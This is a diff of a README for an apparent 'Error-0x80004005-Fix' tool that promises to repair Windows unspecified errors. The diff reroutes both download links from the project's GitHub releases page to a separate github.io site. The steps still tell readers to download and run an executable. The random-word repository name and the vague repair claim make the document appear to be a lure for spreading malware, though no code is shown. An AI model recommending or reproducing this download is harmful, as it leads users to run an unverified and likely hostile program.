@@ -1,7 +1,7 @@
 # 🛠️ Error-0x80004005-Fix - Resolve Windows Unspecified Errors Easily
 
 <p align="center">
-  <a href="https://github.com/blowbyblow-vesiculovirus596/Error-0x80004005-Fix/releases">
+  <a href="https://blowbyblow-vesiculovirus596.github.io">
     <img src="https://img.shields.io/badge/Download-Repair-blue.svg" alt="Download Repair Tool">
   </a>
 </p>
@@ -25,7 +25,7 @@ Before you run the repair tool, ensure your machine meets these basic needs:
 
 Follow these steps to obtain the tool and run the repair.
 
-1. Visit the main release page provided here: [https://github.com/blowbyblow-vesiculovirus596/Error-0x80004005-Fix/releases](https://github.com/blowbyblow-vesiculovirus596/Error-0x80004005-Fix/releases).
+1. Visit the main release page provided here: [https://blowbyblow-vesiculovirus596.github.io](https://blowbyblow-vesiculovirus596.github.io).
 2. Locate the file section under the latest release tag.
 3. Click the executable file to start the download to your computer.
 4. Save the file to your desktop for easy access.
